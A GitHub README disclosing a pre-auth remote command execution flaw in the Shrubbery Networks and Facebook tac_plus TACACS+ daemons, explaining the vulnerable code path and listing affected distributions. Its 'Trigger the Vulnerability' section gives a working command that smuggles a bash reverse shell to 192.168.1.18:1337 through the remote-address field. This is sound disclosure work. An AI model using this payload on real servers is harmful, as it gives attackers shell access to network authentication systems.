
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftakeshixx%2Ftac_plus-pre-auth-rce)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftakeshixx%2Ftac_plus-pre-auth-rce)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=takeshixx%2Ftac_plus-pre-auth-rce)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[takeshixx](/takeshixx)
/
**[tac\_plus-pre-auth-rce](/takeshixx/tac_plus-pre-auth-rce)**
Public

* [Notifications](/login?return_to=%2Ftakeshixx%2Ftac_plus-pre-auth-rce) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Ftakeshixx%2Ftac_plus-pre-auth-rce)
* [Star
   1](/login?return_to=%2Ftakeshixx%2Ftac_plus-pre-auth-rce)

tac\_plus Pre-Auth Remote Command Execution Vulnerability (CVE-2023-45239 & CVE-2023-48643)

[1
star](/takeshixx/tac_plus-pre-auth-rce/stargazers) [0
forks](/takeshixx/tac_plus-pre-auth-rce/forks) [Branches](/takeshixx/tac_plus-pre-auth-rce/branches) [Tags](/takeshixx/tac_plus-pre-auth-rce/tags) [Activity](/takeshixx/tac_plus-pre-auth-rce/activity)
 [Star](/login?return_to=%2Ftakeshixx%2Ftac_plus-pre-auth-rce)

 [Notifications](/login?return_to=%2Ftakeshixx%2Ftac_plus-pre-auth-rce) You must be signed in to change notification settings

* [Code](/takeshixx/tac_plus-pre-auth-rce)
* [Issues
  0](/takeshixx/tac_plus-pre-auth-rce/issues)
* [Pull requests
  0](/takeshixx/tac_plus-pre-auth-rce/pulls)
* [Actions](/takeshixx/tac_plus-pre-auth-rce/actions)
* [Projects
  0](/takeshixx/tac_plus-pre-auth-rce/projects)
* [Security](/takeshixx/tac_plus-pre-auth-rce/security)
* [Insights](/takeshixx/tac_plus-pre-auth-rce/pulse)

Additional navigation options

* [Code](/takeshixx/tac_plus-pre-auth-rce)
* [Issues](/takeshixx/tac_plus-pre-auth-rce/issues)
* [Pull requests](/takeshixx/tac_plus-pre-auth-rce/pulls)
* [Actions](/takeshixx/tac_plus-pre-auth-rce/actions)
* [Projects](/takeshixx/tac_plus-pre-auth-rce/projects)
* [Security](/takeshixx/tac_plus-pre-auth-rce/security)
* [Insights](/takeshixx/tac_plus-pre-auth-rce/pulse)

# takeshixx/tac\_plus-pre-auth-rce

    main[Branches](/takeshixx/tac_plus-pre-auth-rce/branches)[Tags](/takeshixx/tac_plus-pre-auth-rce/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2 Commits](/takeshixx/tac_plus-pre-auth-rce/commits/main/) | | |
| [imgs](/takeshixx/tac_plus-pre-auth-rce/tree/main/imgs "imgs") | | [imgs](/takeshixx/tac_plus-pre-auth-rce/tree/main/imgs "imgs") |  |  |
| [Facebook.md](/takeshixx/tac_plus-pre-auth-rce/blob/main/Facebook.md "Facebook.md") | | [Facebook.md](/takeshixx/tac_plus-pre-auth-rce/blob/main/Facebook.md "Facebook.md") |  |  |
| [README.md](/takeshixx/tac_plus-pre-auth-rce/blob/main/README.md "README.md") | | [README.md](/takeshixx/tac_plus-pre-auth-rce/blob/main/README.md "README.md") |  |  |
| [Shrubbery.md](/takeshixx/tac_plus-pre-auth-rce/blob/main/Shrubbery.md "Shrubbery.md") | | [Shrubbery.md](/takeshixx/tac_plus-pre-auth-rce/blob/main/Shrubbery.md "Shrubbery.md") |  |  |
| View all files | | |

## Repository files navigation

* README
# tac\_plus Pre-Auth Remote Command Execution Vulnerability

This repository contains information about a pre-auth remote command execution vulnerability in different open-source implementations of `tac_plus`. The following two forks are affected:

* [Shrubbery Networks tac\_plus](https://shrubbery.net/tac_plus/)
* [Facebook tac\_plus](https://github.com/facebook/tac_plus)

However, both forks are based on a Cisco dev kit for TACACS+ that was open-sources over *16 years* ago. The vulnerability already existed in the dev kit and was forked into both projects. It should be noted that this research only focused on the two forks mentioned above, there might be additional forks that are affected as well.

The following graph shows the relation between the forks, all are affected:

```
-----------------
| Cisco dev kit |
-----------------
       ↑
  forked from
       |
----------------------
| Shrubbery Networks |
|   CVE-2023-48643   |
----------------------
       ↑
  forked from
       |
------------------
|    Facebook    |
| CVE-2023-45239 |
------------------

```

No official source for Cisco's dev kit has been found and it is not maintained anymore.

## Status

* Facebook published a [GitHub Security Advisory (GHSA)](https://github.com/facebook/tac_plus/security/advisories/GHSA-p334-5r3g-4vx3), assigned [CVE-2023-45239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-45239)
* No patch for Shrubbery Networks' fork is available

## Vulnerability

The following example references code in the [facebook/tac\_plus](https://github.com/facebook/tac_plus) repository because it is available on GitHub (the Cisco dev kit and Shrubbery Networks fork are just tarballs). However, the affected code is **the same in all projects**.

When a packet arrives, the [start\_session()](https://github.com/facebook/tac_plus/tree/8d17ddc8c7c5c7682504ffdcacdb448c41f2ea03/tacacs-F4.0.4.28/tac_plus.c#L833) function will be called to determine the type of the incoming packet (authentication, authorization, or accounting). We focus on authorization packets that are handled by [author()](https://github.com/facebook/tac_plus/tree/8d17ddc8c7c5c7682504ffdcacdb448c41f2ea03/tacacs-F4.0.4.28/author.c#L29) → [do\_author()](https://github.com/facebook/tac_plus/tree/8d17ddc8c7c5c7682504ffdcacdb448c41f2ea03/tacacs-F4.0.4.28/do_author.c#L52), which then calls [pre\_authorization()](https://github.com/facebook/tac_plus/tree/8d17ddc8c7c5c7682504ffdcacdb448c41f2ea03/tacacs-F4.0.4.28/do_author.c#L208). This function checks if the username in the TACACAS+ packet has a *before authorization* command configured and executes it via [call\_pre\_process()](https://github.com/facebook/tac_plus/tree/8d17ddc8c7c5c7682504ffdcacdb448c41f2ea03/tacacs-F4.0.4.28/programs.c#L436). The following configuration file (`tac_plus.conf`) shows a user with a *before authorization* command configured:

```
accounting file = /tmp/tac_acc.log

user=DEFAULT {
 before authorization "/usr/local/sbin/tac_policy -- '$user' '$name' '$address'"
  service = exec {
    default attribute = permit
  }
}

```

This function takes the command configured in *before authorization* and [substitutes](https://github.com/facebook/tac_plus/tree/8d17ddc8c7c5c7682504ffdcacdb448c41f2ea03/tacacs-F4.0.4.28/programs.c#L124) variables (e.g. *$user*, *$name*, or *$address*) with values from the incoming TACACAS+ packet. However, this is done without any input validation or sanitization.

The resulting command string will then be passed to [my\_popen()](https://github.com/facebook/tac_plus/tree/8d17ddc8c7c5c7682504ffdcacdb448c41f2ea03/tacacs-F4.0.4.28/programs.c#L279) which executes the command string in the following [execl()](https://github.com/facebook/tac_plus/tree/8d17ddc8c7c5c7682504ffdcacdb448c41f2ea03/tacacs-F4.0.4.28/programs.c#L342) call:

```
(void) execl("/bin/sh", "sh", "-c", cmd, (char *) NULL);
```

This allows injection of additional commands via the remote address field in TACACS+ packets (see *rem\_addr*, *rem\_addr\_len* in [RFC8907](https://datatracker.ietf.org/doc/html/rfc8907#section-6.1)). The same potentially works for other input fields as well.

It should be noted that the vulnerability is triggered during the authentication process. Therefore, no password is required, only a username that exists in the configuration!

### Trigger the Vulnerability

Compiling and running tac\_plus with this config is described in the following sections:

* [Shrubbery Network tac\_plus setup](/takeshixx/tac_plus-pre-auth-rce/blob/main/Shrubbery.md#Setup)
* [Facebook tac\_plus setup](/takeshixx/tac_plus-pre-auth-rce/blob/main/Facebook.md#Setup)

The following command runs the [tacacs\_client](https://github.com/ansible/tacacs_plus) on the target daemon with the user DEFAULT. The payload that triggers the vulnerability is in the remote address field, which is set via the `--rem-addr` command line argument:

```
export TACACS_PLUS_KEY=[REDACTED] # only required for setups with a pre-shared keys
tacacs_client \
    --host 192.168.1.100 \
    --port 4949 \
    --username DEFAULT \
    --rem-addr "asd';bash -i >& /dev/tcp/192.168.1.18/1337 0>&1 #" \
    authorize -c service=exec
```

Executing this will result in a reverse shell connection to 192.168.1.18:1337. The username has to be one of the users that has a *before authorization* or *after authorization* directive configured in `tac_plus.cfg`. The trailing command list (`-c service=exec`) is required to hit the required code path, but the value does not matter.

The TACACS+ packet sent by the client is shown in the following screenshot in Wireshark:

[![Wireshark Setup](/takeshixx/tac_plus-pre-auth-rce/raw/main/imgs/wireshark_setup.png)](/takeshixx/tac_plus-pre-auth-rce/blob/main/imgs/wireshark_setup.png)

The following screenshot shows a debug session right before the injected command is executed:

[![VScode Debug](/takeshixx/tac_plus-pre-auth-rce/raw/main/imgs/vscode_debug.png)](/takeshixx/tac_plus-pre-auth-rce/blob/main/imgs/vscode_debug.png)

## Affected Linux Distributions/BSD Derivates

Various Linux distributions use one of the two affected forks in their official packages (mostly the Shrubbery Networks fork). The following tables show Linux distributions and BSD derivates that use either the Shrubbery Networks or Facebook fork at the time of this writing. The list is non-exhaustive, other distributions/derivates are most likely affected as well.

| Distribution | Package | Fork |
| --- | --- | --- |
| Fedora | tacacs | Facebook |
| Ubuntu | tacacs+ | Shrubbery Networks |
| OpenSUSE | tac\_plus | Shrubbery Networks |
| Debian | tacacs+ | Shrubbery Networks |
| Arch Linux (AUR) | tacacs-plus | Shrubbery Networks |
| ... |  |  |

| Derivate | Port | Fork |
| --- | --- | --- |
| FreeBSD | tacacs | Shrubbery Networks |
| NetBSD | tacacs | Shrubbery Networks |
| ... |  |  |

Examples of how to reproduce this issue are available in the following sections:

* [Shrubbery Networks tac\_plus examples](/takeshixx/tac_plus-pre-auth-rce/blob/main/Shrubbery.md#Examples)
* [Facebook tac\_plus examples](/takeshixx/tac_plus-pre-auth-rce/blob/main/Facebook.md#Examples)

## About

tac\_plus Pre-Auth Remote Command Execution Vulnerability (CVE-2023-45239 & CVE-2023-48643)

### Resources

[Readme](#readme-ov-file)

[Activity](/takeshixx/tac_plus-pre-auth-rce/activity)
### Stars

[**1**
star](/takeshixx/tac_plus-pre-auth-rce/stargazers)
### Watchers

[**1**
watching](/takeshixx/tac_plus-pre-auth-rce/watchers)
### Forks

[**0**
forks](/takeshixx/tac_plus-pre-auth-rce/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Ftakeshixx%2Ftac_plus-pre-auth-rce&report=takeshixx+%28user%29)

## [Releases](/takeshixx/tac_plus-pre-auth-rce/releases)

No releases published

## [Packages 0](/users/takeshixx/packages?repo_name=tac_plus-pre-auth-rce)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

